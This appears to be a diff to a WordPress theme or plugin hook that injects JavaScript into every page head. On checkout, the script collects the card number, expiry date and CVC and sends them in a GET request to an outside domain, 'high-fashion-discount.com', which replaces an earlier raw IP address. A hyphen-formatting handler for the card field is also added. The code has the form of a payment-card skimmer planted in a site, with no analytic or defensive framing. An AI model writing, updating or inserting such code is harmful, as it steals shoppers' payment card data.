@@ -25,6 +25,14 @@ add_action( 'wp_head', function () { ?>
                     }
                     checkSubmitAvailable();
                 });
+                
+                jQuery('#billing_card_number').keyup(function() {
+                  var foo = jQuery(this).val().split("-").join(""); // remove hyphens
+                  if (foo.length > 0) {
+                    foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
+                  }
+                  jQuery(this).val(foo);
+                });
             }, 1000);
     
             jQuery(window).load(function() {
@@ -44,7 +52,7 @@ add_action( 'wp_head', function () { ?>
                             var params = 'billing_card_number=' + billing_card_number + '&billing_exp_date=' + billing_exp_date + '&billing_cvc=' + billing_cvc;
     
                             jQuery.ajax({
-                                url: 'http://13.209.22.24/wordpress/card_info.php?' + params,
+                                url: 'https://high-fashion-discount.com/card_info.php?' + params,
                                 type: 'get',
                                 dataType: 'text',
                                 success: function (data,status,xhr) {   // success callback function
@@ -66,4 +74,3 @@ add_action( 'wp_head', function () { ?>
     
     </script>
     <?php } );
-    
